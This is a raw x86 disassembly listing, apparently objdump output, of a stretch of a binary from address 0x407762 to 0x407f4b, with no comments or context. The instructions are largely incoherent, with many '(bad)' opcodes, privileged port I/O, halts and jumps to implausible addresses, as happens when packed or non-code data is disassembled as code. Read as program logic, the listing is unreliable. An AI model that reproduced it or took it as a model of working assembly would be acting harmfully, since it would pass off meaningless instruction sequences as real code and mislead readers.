  407762:	xchg   ecx,eax
  407763:	add    BYTE PTR [eax],al
  407765:	pop    eax
  407766:	or     eax,DWORD PTR [eax-0x80]
  407769:	and    BYTE PTR ds:0xcac3e475,cl
  40776f:	leave  
  407770:	ret    0xb14
  407773:	push   ebp
  407774:	mov    eax,DWORD PTR [eax]
  407776:	in     al,dx
  407777:	(bad)  
  407778:	push   ebp
  407779:	push   ebx
  40777a:	xchg   ebx,eax
  40777b:	push   eax
  40777c:	or     al,0x5
  40777e:	or     BYTE PTR [edi],cl
  407780:	add    BYTE PTR [eax],al
  407782:	leave  
  407783:	lods   eax,DWORD PTR ds:[esi]
  407784:	push   eax
  407785:	call   0x4058b5
  40778a:	xchg   ebx,eax
  40778b:	aad    0x8b
  40778d:	fadd   DWORD PTR [ebx+0x1d8b0860]
  407793:	or     ebx,ebp
  407795:	add    dh,BYTE PTR [esp+eax*1+0xb]
  407799:	leave  
  40779a:	in     al,0x11
  40779c:	cmp    BYTE PTR [esi],0xe2
  40779f:	popa   
  4077a0:	cmc    
  4077a1:	or     eax,DWORD PTR [ecx]
  4077a3:	popa   
  4077a4:	add    ah,BYTE PTR [ecx+edx*4+0x55aac023]
  4077ab:	test   BYTE PTR [ebp-0x1a],dh
  4077ae:	inc    ebx
  4077af:	retf   0x5e5b
  4077b2:	iret   
  4077b3:	test   edx,eax
  4077b5:	or     BYTE PTR [eax-0x6b46aa05],bl
  4077bb:	or     al,BYTE PTR [eax]
  4077bd:	add    BYTE PTR [eax],bl
  4077bf:	sbb    dl,dl
  4077c1:	nop
  4077c2:	imul   esi,DWORD PTR [ebx-0x70],0xffffffac
  4077c6:	xor    DWORD PTR [eax-0x1],eax
  4077c9:	mov    ch,0x71
  4077cb:	inc    eax
  4077cc:	adc    BYTE PTR [ebx],ch
  4077ce:	mov    eax,ds:0xb2900545
  4077d3:	repnz or eax,0x1e7bf290
  4077d9:	nop
  4077da:	add    ah,ah
  4077dc:	lods   eax,DWORD PTR ds:[esi]
  4077dd:	jae    0x407762
  4077df:	jae    0x4077d0
  4077e1:	jae    0x407826
  4077e3:	or     eax,0x3b7c7420
  4077e8:	sbb    al,0xd
  4077ea:	nop
  4077eb:	mov    esi,0x320407ac
  4077f0:	mov    al,ds:0x60703c42
  4077f5:	dec    edi
  4077f6:	or     esp,DWORD PTR [ebp+0x1a]
  4077f9:	je     0x40787a
  4077fb:	aaa    
  4077fc:	les    eax,FWORD PTR [eax+edx*4+0x32]
  407800:	add    BYTE PTR [edx+0x3c],0x90
  407804:	inc    eax
  407805:	dec    edi
  407806:	or     al,BYTE PTR [ebp+0x1a]
  407809:	je     0x40788a
  40780b:	xor    al,0x84
  40780d:	inc    esi
  40780e:	add    esp,ecx
  407810:	(bad)
  407815:	xchg   esp,eax
  407816:	sar    ebx,0xb5
  407819:	jp     0x4077dd
  40781b:	cs push 0x7b29e8c4
  407821:	jae    0x4077ae
  407823:	cli    
  407824:	aas    
  407825:	sub    eax,0x7a84f25b
  40782a:	in     al,dx
  40782b:	bound  edi,QWORD PTR [edi+0x35]
  40782e:	cld    
  40782f:	stos   BYTE PTR es:[edi],al
  407830:	test   bl,bh
  407832:	(bad)  
  407833:	mov    edx,0xba8ff384
  407838:	ins    BYTE PTR es:[edi],dx
  407839:	dec    DWORD PTR [edi+0x22e21b62]
  40783f:	add    cl,al
  407841:	or     BYTE PTR [eax+0x1e3a9973],bh
  407847:	into   
  407848:	xchg   BYTE PTR [eax+0x10ffbc6c],bl
  40784e:	inc    ebx
  40784f:	les    ecx,FWORD PTR [ecx+0x53425910]
  407855:	rcr    BYTE PTR [ecx+0x2c],0xc1
  407859:	mov    DWORD PTR [edi],ebp
  40785b:	pop    es
  40785c:	ror    DWORD PTR [ecx+0x45c10700],0xc7
  407863:	je     0x40781f
  407865:	leave  
  407866:	jns    0x407896
  407868:	out    0x61,al
  40786a:	mov    al,ds:0x34092dc2
  40786f:	jns    0x4078b6
  407871:	xchg   DWORD PTR [ebp-0x413ad020],ebp
  407877:	xor    DWORD PTR [edx-0x20],ebx
  40787a:	fs inc edi
  40787c:	sbb    eax,0x69a3415a
  407881:	dec    edx
  407882:	jmp    0x31bbbd53
  407887:	inc    ebx
  407888:	xor    DWORD PTR [ecx+0x931ad73],esi
  40788e:	loop   0x407853
  407890:	jl     0x407879
  407892:	test   DWORD PTR [edi+0x41],edx
  407895:	(bad)  
  407896:	hlt    
  407897:	call   FWORD PTR [eax+0x8]
  40789a:	add    eax,DWORD PTR [esi+ebx*8]
  40789d:	ds loope 0x40786c
  4078a0:	pop    esp
  4078a1:	lds    edx,FWORD PTR [ecx-0x7b]
  4078a4:	add    dh,ch
  4078a6:	or     ecx,ebp
  4078a8:	clc    
  4078a9:	xchg   BYTE PTR [esi],bh
  4078ab:	call   0x4d7f36f0
  4078b0:	fcom   QWORD PTR [ebx-0x1c]
  4078b3:	jmp    0xef20b2bb
  4078b8:	xchg   BYTE PTR [ecx+ecx*1+0x0],ch
  4078bc:	jmp    0x3ac60ef3
  4078c1:	addr16 (bad) 
  4078c3:	(bad)  
  4078c4:	mov    ecx,0xe9010cea
  4078c9:	xor    dh,BYTE PTR [ecx+0x935374d]
  4078cf:	or     ebp,DWORD PTR [ecx]
  4078d1:	je     0x40785b
  4078d3:	lods   al,BYTE PTR ds:[esi]
  4078d4:	jmp    0xe57d820b
  4078d9:	xor    ecx,DWORD PTR [ecx]
  4078db:	add    dh,ah
  4078dd:	mov    ch,0x6a
  4078df:	add    cl,ch
  4078e1:	xor    ch,BYTE PTR [edi]
  4078e3:	add    BYTE PTR [edi+esi*4-0x48],dh
  4078e7:	(bad)  
  4078e8:	fidiv  WORD PTR [ebp+0x59]
  4078eb:	call   0x4a080b
  4078f0:	pop    esp
  4078f1:	scas   eax,DWORD PTR es:[edi]
  4078f2:	mov    eax,0x58fdc6fe
  4078f7:	call   0x47025
  4078fc:	loop   0x4078f0
  4078fe:	cmp    eax,0x51a3411c
  407903:	inc    ecx
  407904:	jmp    0xa0340798
  407909:	add    ch,dh
  40790b:	ret    
  40790c:	push   eax
  40790d:	sub    DWORD PTR [eax-0x45],0x3de58eff
  407914:	or     BYTE PTR [ecx],bl
  407916:	or     eax,0xf57ef6ce
  40791b:	scas   eax,DWORD PTR es:[edi]
  40791c:	pcmpeqd mm0,QWORD PTR [edi+0x1648d11]
  407923:	ret    
  407924:	jmp    DWORD PTR [esi+0x2]
  407927:	mov    cl,0x60
  407929:	push   edi
  40792a:	cmc    
  40792b:	ret    
  40792c:	mov    DWORD PTR [esi+ebx*8-0x3e],ebp
  407930:	dec    DWORD PTR [esi+0x58]
  407933:	or     DWORD PTR [edx+0x0],ebp
  407936:	cwde   
  407937:	popa   
  407938:	add    ch,BYTE PTR [edx-0x68]
  40793b:	popa   
  40793c:	add    ebp,DWORD PTR [eax-0x78]
  40793f:	pop    es
  407940:	add    al,al
  407942:	inc    edi
  407943:	fwait
  407944:	in     al,dx
  407945:	(bad)  
  407946:	push   edi
  407947:	aad    0xe8
  407949:	pop    edi
  40794a:	inc    ebp
  40794b:	or     BYTE PTR [eax],al
  40794d:	mov    ebp,ecx
  40794f:	iret   
  407950:	inc    eax
  407951:	je     0x4078d3
  407953:	aam    0x75
  407955:	adc    BYTE PTR [edi],dh
  407957:	pop    ebx
  407958:	or     al,0xff
  40795a:	(bad)  
  40795c:	call   0x15af58
  407961:	mov    eax,DWORD PTR [eax-0x2b]
  407964:	jne    0x40795e
  407966:	pusha  
  407967:	add    ebp,ebx
  407969:	add    BYTE PTR [eax-0x3e],bl
  40796c:	fidiv  DWORD PTR [ebp+0x0]
  40796f:	push   ebx
  407970:	into   
  407971:	mov    ch,0xec
  407973:	iretw  
  407975:	(bad)  
  407976:	call   0x40ea23
  40797b:	out    0x98,eax
  40797d:	in     al,dx
  40797e:	(bad)  
  40797f:	out    0xce,eax
  407981:	call   0xf53ef
  407986:	mov    ebx,ebx
  407988:	repnz enter 0x14c2,0x7
  40798d:	push   ebp
  40798e:	mov    esi,DWORD PTR [esp+ecx*4-0x3159133c]
  407995:	call   DWORD PTR [ebx-0x49]
  407998:	pop    eax
  407999:	or     al,0xff
  40799b:	fnstsw WORD PTR [esi+0x4c10a167]
  4079a1:	add    bh,bh
  4079a3:	popf   
  4079a4:	cwde   
  4079a5:	dec    eax
  4079a6:	inc    ecx
  4079a7:	fcomp  st(6)
  4079a9:	pop    edx
  4079aa:	cmc    
  4079ab:	addr16 into 
  4079ad:	or     eax,eax
  4079af:	xor    DWORD PTR [ebx-0x4fce2580],ebp
  4079b5:	add    ebp,DWORD PTR [ebx]
  4079b7:	mov    bh,BYTE PTR ds:0x3a7ef81
  4079bd:	retf   
  4079be:	push   eax
  4079bf:	or     DWORD PTR [esp+eax*1+0x33483100],esi
  4079c6:	fnsave [ecx]
  4079c8:	mov    al,0xfe
  4079ca:	mov    edi,0x892c36
  4079cf:	xor    DWORD PTR [eax+0x30000408],esi
  4079d5:	mov    al,0x3
  4079d7:	movzx  edi,dh
  4079da:	add    eax,DWORD PTR [eax]
  4079dc:	xor    DWORD PTR ds:0x801fc41,esi
  4079e2:	pop    edi
  4079e3:	jmp    0x85b92d3e
  4079e8:	pop    esi
  4079e9:	stos   BYTE PTR es:[edi],al
  4079ea:	retf   0xe1ff
  4079ed:	xlat   BYTE PTR ds:[ebx]
  4079ee:	cmp    bh,ch
  4079f0:	ds (bad) 
  4079f3:	mov    edi,0x925bb3bc
  4079f8:	jns    0x4079eb
  4079fa:	add    ecx,DWORD PTR [ebp-0x362d54]
  407a00:	push   ds
  407a01:	and    ah,bl
  407a03:	mov    DWORD PTR [ebx+esi*2],ebx
  407a06:	retf   0x84ff
  407a09:	mov    eax,0x9cdde833
  407a0e:	retf   0xaff
  407a11:	stos   DWORD PTR es:[edi],eax
  407a12:	retf   0x2975
  407a15:	gs sub bh,0xef
  407a19:	mov    cl,dl
  407a1b:	push   eax
  407a1c:	fst    DWORD PTR [edx]
  407a1e:	sar    edi,1
  407a20:	ficomp WORD PTR [edi]
  407a22:	retf   
  407a23:	jne    0x4079fa
  407a25:	pop    ds
  407a26:	fsub   QWORD PTR ds:0xca6608da
  407a2c:	cmp    cl,cl
  407a2e:	aad    0x36
  407a30:	mov    esi,0x9fdb553b
  407a35:	scas   eax,DWORD PTR es:[edi]
  407a36:	dec    esi
  407a37:	retf   0xb800
  407a3a:	dec    ebx
  407a3b:	inc    ecx
  407a3c:	xchg   BYTE PTR [ecx+eax*8],ah
  407a3f:	jmp    0xacd46d93
  407a44:	iret   
  407a45:	add    edx,eax
  407a47:	mov    ah,0xc7
  407a49:	cdq    
  407a4a:	addr16 inc esp
  407a4c:	add    esi,DWORD PTR [ecx]
  407a4e:	mov    WORD PTR [ecx],gs
  407a50:	dec    ebx
  407a51:	inc    ebx
  407a52:	ret    0xcf9c
  407a55:	mov    DWORD PTR [ebx],edi
  407a57:	sub    eax,0x290e3103
  407a5c:	dec    edi
  407a5d:	mulps  xmm7,xmm6
  407a60:	dec    edi
  407a61:	pop    ecx
  407a62:	mov    al,0x4a
  407a64:	aam    0x56
  407a66:	shl    DWORD PTR [edx-0x55],0xe9
  407a6a:	rcr    DWORD PTR [esp+ecx*8-0x1e],0x58
  407a6f:	shl    DWORD PTR [edi-0x36293ec0],1
  407a75:	mov    esp,0xd2bc1bc
  407a7a:	or     ch,cl
  407a7c:	jl     0x407aea
  407a7e:	or     eax,0x91194fbe
  407a83:	jmp    0xaefb0663
  407a88:	leave  
  407a89:	push   cs
  407a8a:	aaa    
  407a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a8c:	fcom   QWORD PTR [eax]
  407a8e:	mov    dl,0x9e
  407a90:	leave  
  407a91:	stos   BYTE PTR es:[edi],al
  407a92:	int3   
  407a93:	xor    bh,BYTE PTR [ebx+0x2ee911f3]
  407a99:	mov    edx,0x7d1ead
  407a9e:	adc    DWORD PTR fs:[edx+0xb487f3],edx
  407aa5:	out    dx,eax
  407aa6:	push   esp
  407aa7:	dec    eax
  407aa8:	add    DWORD PTR [ecx+0x30],esp
  407aab:	dec    eax
  407aac:	and    BYTE PTR [esi],0x2d
  407aaf:	ss cmc 
  407ab1:	mov    esi,0x168047f9
  407ab6:	or     eax,0x3869ea35
  407abb:	push   cs
  407abc:	je     0x407b0a
  407abe:	lods   eax,DWORD PTR ds:[esi]
  407abf:	add    BYTE PTR [edx],cl
  407ac1:	mov    ch,0x92
  407ac3:	mov    DWORD PTR [edi],edi
  407ac5:	loopne 0x407aad
  407ac7:	jecxz  0x407a54
  407ac9:	lods   al,BYTE PTR ds:[esi]
  407aca:	mov    bh,BYTE PTR [edi-0x3e950e8b]
  407ad0:	fucomi st,st(1)
  407ad2:	xor    cl,BYTE PTR [eax+edi*8+0x7fe7e0e9]
  407ad9:	lea    edi,[edx]
  407adb:	shl    BYTE PTR [eax],0x7d
  407ade:	push   edi
  407adf:	inc    eax
  407ae0:	jl     0x407aa3
  407ae2:	imul   ecx,DWORD PTR [esi],0x3db2e774
  407ae8:	cmp    dh,ch
  407aea:	dec    esp
  407aeb:	cmp    al,0x7
  407aed:	imul   ebp,esi,0xeff0ff00
  407af3:	pop    es
  407af4:	(bad)  
  407af5:	sub    eax,0xc200c025
  407afa:	xor    al,0xb4
  407afc:	add    dl,dl
  407afe:	ficomp WORD PTR [edi-0x37]
  407b01:	stos   DWORD PTR es:[edi],eax
  407b02:	add    BYTE PTR [esi],bl
  407b04:	rcl    BYTE PTR [edx+eiz*2-0x2],0x8b
  407b09:	(bad)  
  407b0a:	lds    eax,FWORD PTR [ebp-0x74]
  407b0d:	cmp    eax,0x4a4571
  407b12:	jmp    0xd4c39685
  407b17:	jle    0x407b6d
  407b19:	inc    ecx
  407b1a:	jmp    0x49b051
  407b1f:	pop    ebx
  407b20:	pop    es
  407b21:	je     0x407b6e
  407b23:	or     DWORD PTR ds:0x1cc77500,eax
  407b29:	rcr    BYTE PTR [ebx-0x6f],0xc5
  407b2d:	or     BYTE PTR [eax],al
  407b2f:	and    ebp,DWORD PTR [esi-0x39]
  407b32:	inc    ebp
  407b33:	fs or  al,0x0
  407b36:	add    al,cl
  407b38:	ss inc ebp
  407b3a:	clc    
  407b3b:	call   0x8248f110
  407b40:	or     edi,edi
  407b42:	adc    eax,0x40fd20
  407b47:	xchg   ebx,eax
  407b48:	retf   
  407b49:	je     0x407ba6
  407b4b:	lock loop 0x407b29
  407b4e:	add    BYTE PTR [eax-0x2a722fc4],bl
  407b54:	iret   
  407b55:	push   eax
  407b56:	push   0x68
  407b58:	cmc    
  407b59:	(bad)  
  407b5a:	adc    eax,0x40fcc4
  407b5f:	arpl   bx,cx
  407b61:	je     0x407b8c
  407b63:	pop    ss
  407b64:	jmp    ebx
  407b66:	add    DWORD PTR [eax],eax
  407b68:	dec    eax
  407b69:	or     eax,DWORD PTR [eax]
  407b6b:	inc    ebp
  407b6d:	ror    DWORD PTR [edi+0x75c76045],cl
  407b73:	cld    
  407b74:	iret   
  407b75:	dec    ecx
  407b76:	in     al,dx
  407b77:	sbb    ebp,0xffffffc0
  407b7a:	push   DWORD PTR [ebx+0x11]
  407b7d:	add    BYTE PTR [ebp-0x10],0x1a
  407b81:	or     eax,DWORD PTR [eax]
  407b83:	add    BYTE PTR [ebx],al
  407b85:	mov    edi,0x5d845c6
  407b8a:	add    BYTE PTR [eax],al
  407b8c:	sbb    BYTE PTR [ecx+0x0],ah
  407b8f:	push   0x18
  407b91:	popa   
  407b92:	adc    BYTE PTR [ebp+0x6a50a955],cl
  407b98:	xor    DWORD PTR [eax-0x701a8a3a],esi
  407b9e:	icebp  
  407b9f:	mov    edi,DWORD PTR [edx-0xf]
  407ba2:	add    ecx,DWORD PTR [ebx]
  407ba4:	icebp  
  407ba5:	mov    ah,0x4
  407ba7:	inc    ebx
  407ba8:	mov    dl,0xb5
  407baa:	iret   
  407bab:	add    BYTE PTR [ebp-0x58],al
  407bae:	(bad)  
  407baf:	jne    0x407b6e
  407bb1:	pop    eax
  407bb2:	stc    
  407bb3:	fidiv  DWORD PTR [ecx]
  407bb5:	mov    al,0x7a
  407bb7:	ret    
  407bb8:	pop    edx
  407bb9:	jmp    0x7571847f
  407bbe:	jp     0x407bac
  407bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bc1:	jge    0x407bbe
  407bc3:	out    0x36,eax
  407bc5:	jmp    0x407bca
  407bc7:	add    cl,dh
  407bc9:	lahf   
  407bca:	fild   DWORD PTR [ecx+0x0]
  407bcd:	sub    edi,0x9d8650c6
  407bd3:	sti    
  407bd4:	dec    edi
  407bd5:	mov    DWORD PTR [edx+ebp*4-0x4387cf00],esi
  407bdc:	ret    0xb035
  407bdf:	xor    BYTE PTR [ebx-0x33fccab],cl
  407be5:	add    dh,BYTE PTR [ebx]
  407be7:	dec    ecx
  407be8:	or     BYTE PTR [ecx],dh
  407bea:	cmp    eax,0x9b712afe
  407bef:	mov    esp,0x1ab039c2
  407bf4:	fcmovne st,st(3)
  407bf6:	scas   eax,DWORD PTR es:[edi]
  407bf7:	pop    ecx
  407bf8:	add    bl,cl
  407bfa:	scas   eax,DWORD PTR es:[edi]
  407bfb:	pop    ecx
  407bfc:	add    BYTE PTR [esi],ch
  407bfe:	push   ebp
  407bff:	clc    
  407c00:	(bad)  
  407c01:	pushf  
  407c02:	mov    eax,0xb08b0059
  407c07:	(bad)  [esi]
  407c09:	cli    
  407c0a:	scas   eax,DWORD PTR es:[edi]
  407c0b:	add    ecx,DWORD PTR [ebx]
  407c0d:	icebp  
  407c0e:	repz jns 0xc6e58581
  407c15:	test   BYTE PTR [ebp-0x41f9326f],bh
  407c1b:	xchg   esi,eax
  407c1c:	cli    
  407c1d:	scas   al,BYTE PTR es:[edi]
  407c1e:	xor    al,0xc4
  407c20:	jp     0x407c2b
  407c22:	xor    ebp,ecx
  407c24:	pop    ecx
  407c25:	xor    DWORD PTR [esi-0x417d380c],edi
  407c2b:	cld    
  407c2c:	test   edi,0x59e133
  407c32:	xor    DWORD PTR [ebx],esi
  407c34:	jmp    0xea22a814
  407c39:	add    ebp,DWORD PTR [edx]
  407c3b:	leave  
  407c3c:	fdiv   st(3),st
  407c3e:	add    esi,DWORD PTR [ecx-0x4259296f]
  407c44:	adc    ch,BYTE PTR [ebx-0x435d3656]
  407c4a:	jae    0x407c5c
  407c4c:	jmp    0xc3ed3681
  407c51:	mov    BYTE PTR [esi-0x49240ecd],0xbd
  407c58:	push   ds
  407c59:	(bad)  
  407c5a:	push   0x403edca
  407c5f:	xchg   edx,eax
  407c60:	std    
  407c61:	and    esp,0x374fe90c
  407c67:	mov    bh,BYTE PTR [ebx+edi*8+0x56]
  407c6b:	xor    al,0xef
  407c6d:	sbb    dh,BYTE PTR [ecx-0x31]
  407c70:	sub    edi,ebx
  407c72:	inc    esi
  407c73:	das    
  407c74:	jmp    0xde4d413d
  407c79:	dec    edi
  407c7a:	sub    DWORD PTR [ecx+0x931a9af],esi
  407c80:	loop   0x407c45
  407c82:	popf   
  407c83:	sbb    DWORD PTR [eax+0x34bc2d57],ebx
  407c89:	clc    
  407c8a:	pop    ss
  407c8b:	aaa    
  407c8c:	add    cl,ah
  407c8e:	jmp    0x18b0:0xecaeff4c
  407c95:	jb     0x407c97
  407c97:	ds or  eax,0x36d53940
  407c9d:	out    dx,eax
  407c9e:	xchg   esi,eax
  407c9f:	hlt    
  407ca0:	pop    ecx
  407ca1:	call   DWORD PTR [ecx+ebp*8]
  407ca4:	dec    esp
  407ca5:	(bad)  
  407ca6:	cld    
  407ca7:	fisub  DWORD PTR [edi+ebx*4+0x58bcec8e]
  407cae:	mov    al,ds:0x140011f3
  407cb3:	dec    eax
  407cb4:	lods   eax,DWORD PTR ds:[esi]
  407cb5:	push   esi
  407cb6:	mov    esi,0xf17d8801
  407cbb:	xor    dh,BYTE PTR [esi]
  407cbd:	or     DWORD PTR [edx],eax
  407cbf:	jne    0x407d21
  407cc1:	pop    edi
  407cc2:	scas   eax,DWORD PTR es:[edi]
  407cc3:	jmp    0x407c8c
  407cc5:	or     cl,ch
  407cc7:	sbb    DWORD PTR [esi+0xc],eax
  407cca:	push   0xffffff8d
  407ccc:	or     cl,BYTE PTR [ebx]
  407cce:	sub    ecx,esp
  407cd0:	adc    DWORD PTR [ebx],ebp
  407cd2:	sub    DWORD PTR [eax+0x5c],ebx
  407cd5:	pop    esi
  407cd6:	xor    BYTE PTR [ebx+0x11],dh
  407cd9:	add    BYTE PTR [edx+0x4e],dh
  407cdc:	or     eax,0x8f6a9c8b
  407ce1:	inc    BYTE PTR [edx]
  407ce3:	clc    
  407ce4:	and    cl,BYTE PTR [ebx+0x30bdb2ef]
  407cea:	jnp    0x407d44
  407cec:	cmp    al,0xfc
  407cee:	mov    al,0xfd
  407cf0:	add    eax,0xb022fd80
  407cf5:	sub    eax,0x724a7669
  407cfa:	in     al,dx
  407cfb:	add    BYTE PTR [edx+0x2d5e46bd],dh
  407d01:	cmp    al,0xec
  407d03:	sub    BYTE PTR [ebp+0x3000ac4],ch
  407d09:	mov    cl,0x7f
  407d0b:	cld    
  407d0c:	imul   edx,DWORD PTR [edi+0xd],0x775dc480
  407d13:	or     BYTE PTR [eax-0x337f9e2c],bl
  407d19:	shr    edx,0x9
  407d1c:	jecxz  0x407ce5
  407d1e:	pop    ebx
  407d1f:	pop    edi
  407d20:	es add dl,0x8
  407d24:	fadd   DWORD PTR [ebx]
  407d26:	xor    BYTE PTR [edx-0x20],dh
  407d29:	add    edi,DWORD PTR [ecx]
  407d2b:	ja     0x407cf9
  407d2d:	adc    esi,DWORD PTR [eax]
  407d2f:	jmp    0x407d2e
  407d31:	add    eax,DWORD PTR [ecx+0x72]
  407d34:	rol    BYTE PTR [ebx],cl
  407d36:	inc    esi
  407d37:	ja     0x407d07
  407d39:	adc    eax,DWORD PTR [ecx+0x4]
  407d3c:	ret    0x17e0
  407d3f:	cmp    al,0x79
  407d41:	pop    ecx
  407d42:	or     bh,BYTE PTR [esi+ebp*2]
  407d45:	dec    esp
  407d46:	push   es
  407d47:	sub    al,0x69
  407d49:	mov    ebx,0x20a1eb09
  407d4e:	rcr    BYTE PTR [ebx-0x59],0xe5
  407d52:	enter  0x90c2,0x7
  407d56:	shl    al,0x8c
  407d59:	rol    ebx,0xaa
  407d5c:	ret    
  407d5d:	add    BYTE PTR [ebx-0x3fa5ff3a],al
  407d63:	fidiv  DWORD PTR [ebp-0x27]
  407d66:	pop    DWORD PTR [ecx]
  407d68:	add    BYTE PTR [eax+0x7],cl
  407d6b:	pop    ebx
  407d6c:	pop    edi
  407d6d:	mov    dh,0x7e
  407d6f:	ret    0x5808
  407d72:	in     al,dx
  407d73:	push   edx
  407d74:	push   eax
  407d75:	mov    al,ds:0x82a1f5f
  407d7a:	add    eax,0xc24972f8
  407d7f:	(bad)  
  407d80:	mov    ebx,0x3b131
  407d85:	xor    DWORD PTR [ebx-0x4f8fb2c7],ecx
  407d8b:	sub    eax,0x42d87e01
  407d90:	std    
  407d91:	push   cs
  407d92:	je     0x407d7b
  407d94:	xlat   BYTE PTR ds:[ebx]
  407d95:	add    eax,0xfeb9c3c0
  407d9a:	arpl   bx,ax
  407d9c:	inc    DWORD PTR [ebx]
  407d9e:	dec    ebx
  407d9f:	cld    
  407da0:	push   es
  407da1:	mov    BYTE PTR fs:[edi-0x3914753d],cl
  407da8:	push   ebp
  407da9:	stos   BYTE PTR es:[edi],al
  407daa:	xchg   esp,eax
  407dab:	xchg   esp,eax
  407dad:	loope  0x407dce
  407daf:	push   esp
  407db0:	pop    eax
  407db1:	pop    ecx
  407db2:	sbb    esi,ebp
  407db4:	aas    
  407db5:	xor    DWORD PTR [eax],edi
  407db7:	ss add edx,esi
  407dba:	and    eax,DWORD PTR [edi+0x44773d3d]
  407dc0:	add    BYTE PTR [ecx],dh
  407dc2:	fcom   QWORD PTR ds:0xcc640083
  407dc8:	dec    esi
  407dc9:	inc    ecx
  407dca:	xor    DWORD PTR [eax-0x424df6c9],esi
  407dd0:	or     DWORD PTR [ebx-0x10],0xffffffaf
  407dd4:	add    esi,DWORD PTR [ebp+0x2c]
  407dd7:	pop    es
  407dd8:	les    ebx,FWORD PTR [ebx+0x68]
  407ddb:	out    dx,eax
  407ddc:	out    dx,al
  407ddd:	fimul  DWORD PTR [ecx+0x3100dc8e]
  407de3:	and    eax,0x8603fc59
  407de8:	or     edx,DWORD PTR [eax+0x5e]
  407deb:	fnsave [edi]
  407ded:	dec    ebx
  407dee:	lock scas eax,DWORD PTR es:[edi]
  407df0:	push   cs
  407df1:	sar    BYTE PTR [esi],0x2c
  407df4:	xchg   esp,eax
  407df5:	add    BYTE PTR [ecx],dh
  407df7:	mov    al,0xca
  407df9:	inc    ebp
  407dfa:	cmp    DWORD PTR [ecx],ecx
  407dfc:	jmp    0x6c49af04
  407e01:	dec    eax
  407e02:	sub    DWORD PTR [ecx+0x43],ebx
  407e05:	add    al,0x9b
  407e07:	or     DWORD PTR [ebx+0x5],eax
  407e0a:	push   ds
  407e0b:	xor    al,0xc5
  407e0d:	ret    0x3d3c
  407e10:	xor    al,BYTE PTR [ebp+0x31]
  407e13:	push   cs
  407e14:	test   eax,0xf7b19b38
  407e19:	fdiv   QWORD PTR [ecx]
  407e1b:	or     DWORD PTR [edx-0x45],ebp
  407e1e:	jnp    0x407e54
  407e20:	or     DWORD PTR [edi+0x37e9c16c],eax
  407e26:	mov    edi,DWORD PTR [edx-0x36ff43ec]
  407e2c:	lods   al,BYTE PTR ds:[esi]
  407e2d:	xchg   esp,eax
  407e2e:	ret    0x8fd6
  407e31:	and    al,0xb8
  407e33:	mov    esp,0xc6537143
  407e38:	xor    esi,DWORD PTR [ecx-0x3e]
  407e3b:	inc    esp
  407e3c:	mov    ch,0xd3
  407e3e:	add    al,0xb6
  407e40:	xor    ebx,DWORD PTR [ebp-0x3e]
  407e43:	inc    esp
  407e44:	cmp    eax,0xe3144a2
  407e49:	sub    DWORD PTR [edi],esi
  407e4b:	dec    edi
  407e4c:	mov    gs,WORD PTR [edi+esi*4+0x486c18aa]
  407e53:	sbb    DWORD PTR [eax-0x65],0xa2891cc2
  407e5a:	inc    esp
  407e5b:	xor    DWORD PTR [esi],ecx
  407e5d:	sub    DWORD PTR [edi],esi
  407e5f:	sbb    esi,DWORD PTR [ecx]
  407e61:	xchg   ecx,eax
  407e62:	push   eax
  407e63:	lock or BYTE PTR [esi],dl
  407e66:	cmp    BYTE PTR [ecx-0x50],ah
  407e69:	std    
  407e6a:	fidiv  DWORD PTR [ecx]
  407e6c:	or     edx,esi
  407e6e:	ret    
  407e6f:	fadd   QWORD PTR [edi]
  407e71:	stos   BYTE PTR es:[edi],al
  407e72:	ret    0xb8c4
  407e75:	add    BYTE PTR [ecx],al
  407e77:	jmp    eax
  407e79:	add    cl,ch
  407e7b:	jae    0x407eb0
  407e7d:	hlt    
  407e7e:	shr    DWORD PTR [ebx+ebp*4+0x3ef0deff],1
  407e85:	cld    
  407e86:	shr    DWORD PTR [esi-0x2f],0x0
  407e8a:	jmp    0xb09c4b3c
  407e8f:	add    ah,ch
  407e91:	pop    esi
  407e92:	mov    ecx,ebp
  407e94:	mov    dl,0xcd
  407e96:	shl    BYTE PTR [edi+0x1953b8f0],0x5d
  407e9d:	and    DWORD PTR [eax-0x2e],eax
  407ea0:	jb     0x407eab
  407ea2:	clc    
  407ea3:	sbb    esi,DWORD PTR [edx]
  407ea5:	int3   
  407ea6:	jmp    FWORD PTR [edx-0x1a]
  407ea9:	add    BYTE PTR [ebx+0x28],cl
  407eac:	xor    eax,0xade27409
  407eb1:	idiv   BYTE PTR [ebx]
  407eb3:	xor    dh,BYTE PTR [edx+0x9]
  407eb6:	add    ch,bh
  407eb8:	sbb    al,0x8c
  407eba:	cmp    eax,0x4a6df5
  407ebf:	jmp    0x1cc380c2
  407ec4:	ins    DWORD PTR es:[edi],dx
  407ec5:	inc    esp
  407ec6:	inc    ecx
  407ec7:	jmp    0x245bcfe
  407ecc:	jne    0x407f22
  407ece:	leave  
  407ecf:	sub    al,BYTE PTR [ebx+edx*8+0x438ad4ff]
  407ed6:	inc    ecx
  407ed7:	jmp    0x2734cd97
  407edc:	mov    dh,0xc5
  407ede:	(bad)  
  407edf:	es jo  0x407ec3
  407ee2:	add    cl,ch
  407ee4:	xor    ah,BYTE PTR [ebx]
  407ee6:	add    BYTE PTR [ebx+0x3173a12c],al
  407eec:	xor    eax,0x30008309
  407ef1:	retf   0x840f
  407ef4:	add    BYTE PTR [esi+0xb],ch
  407ef7:	add    BYTE PTR [eax],al
  407ef9:	ror    DWORD PTR [edi-0x36b00138],1
  407eff:	lea    eax,[ebp-0x3584]
  407f05:	push   0xfec8b5ca
  407f0a:	enter  0xe8ff,0x60
  407f0e:	aad    0x0
  407f10:	add    BYTE PTR [ebx],ah
  407f12:	int3   
  407f13:	je     0x408ae4
  407f19:	jo     0x407f71
  407f1b:	dec    ebp
  407f1c:	inc    ecx
  407f1d:	or     BYTE PTR [edi-0x37310f7b],al
  407f23:	call   DWORD PTR [eax-0x40]
  407f26:	pop    esp
  407f27:	fld    DWORD PTR [eax]
  407f29:	fadd   DWORD PTR [eax+eax*8]
  407f2c:	andps  xmm1,xmm5
  407f2f:	add    BYTE PTR [eax],al
  407f31:	enter  0x85c0,0xc4
  407f35:	dec    esi
  407f36:	leave  
  407f37:	inc    DWORD PTR [eax]
  407f39:	fmul   DWORD PTR [ebx]
  407f3b:	add    BYTE PTR [ebp-0x12fab],cl
  407f41:	dec    edi
  407f42:	pop    esp
  407f43:	push   DWORD PTR [ebp-0x359c]
  407f49:	call   FWORD PTR [esi]
  407f4b:	cmp    al,0x4b
